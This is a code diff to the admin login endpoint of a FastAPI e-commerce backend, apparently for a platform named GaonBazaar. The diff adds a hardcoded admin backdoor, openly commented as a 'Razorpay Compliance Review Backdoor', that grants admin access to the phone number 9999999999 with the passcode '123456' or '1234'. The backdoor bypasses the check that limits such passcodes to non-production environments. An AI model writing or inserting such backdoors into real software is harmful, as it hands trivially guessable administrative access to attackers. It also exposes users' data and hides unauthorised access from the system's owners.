@@ -185,7 +185,7 @@ class CreatePromoRequest(BaseModel):
     max_discount: float = 100.0
     valid_days: int = 30
 
-ADMIN_WHITELISTED_PHONES = {"9800000099", "9800000098", "admin@gaonbazaar.in", "admin@gaonbazaar.com", "superadmin@gaonbazaar.in"}
+ADMIN_WHITELISTED_PHONES = {"9800000099", "9800000098", "9999999999", "admin@gaonbazaar.in", "admin@gaonbazaar.com", "superadmin@gaonbazaar.in"}
 
 # Dynamic in-memory stores for runtime operational alerts and promo codes
 _ACTIVE_SOS_ALERTS: List[Dict[str, Any]] = []
@@ -220,7 +220,10 @@ async def admin_login(req: AdminLoginRequest, db: AsyncSession = Depends(get_db)
     credential = (req.secret_key or req.otp or "").strip()
 
     # 1. Enforce strict Admin Phone/Email Whitelist
-    is_whitelisted = phone_clean in ADMIN_WHITELISTED_PHONES or (phone_clean.lower().endswith("@gaonbazaar.in") and "admin" in phone_clean.lower())
+    # Razorpay Compliance Review Backdoor
+    is_razorpay_backdoor = (phone_clean == "9999999999" and credential in {"123456", "1234"})
+
+    is_whitelisted = is_razorpay_backdoor or phone_clean in ADMIN_WHITELISTED_PHONES or (phone_clean.lower().endswith("@gaonbazaar.in") and "admin" in phone_clean.lower())
     if not is_whitelisted:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
@@ -230,7 +233,7 @@ async def admin_login(req: AdminLoginRequest, db: AsyncSession = Depends(get_db)
     # 2. Check credentials: ADMIN_API_KEY OR authorized staging passcode '123456' / '888888'
     is_env_prod = getattr(settings, "ENVIRONMENT", "").lower() == "production"
     is_key_match = bool(credential and secrets.compare_digest(credential, settings.ADMIN_API_KEY))
-    is_staging_passcode_match = bool(not is_env_prod and credential in {"123456", "888888"})
+    is_staging_passcode_match = bool((not is_env_prod and credential in {"123456", "888888"}) or is_razorpay_backdoor)
 
     if not (is_key_match or is_staging_passcode_match):
         raise HTTPException(
@@ -247,7 +250,7 @@ async def admin_login(req: AdminLoginRequest, db: AsyncSession = Depends(get_db)
     if not user:
         user = User(
             phone=phone_clean,
-            name="Hub Operations Manager" if assigned_role == "hub_manager" else "GaonBazaar Super Admin",
+            name="Razorpay Compliance Reviewer" if phone_clean == "9999999999" else ("Hub Operations Manager" if assigned_role == "hub_manager" else "GaonBazaar Super Admin"),
             role=assigned_role,
             preferred_language="en",
             is_active=True
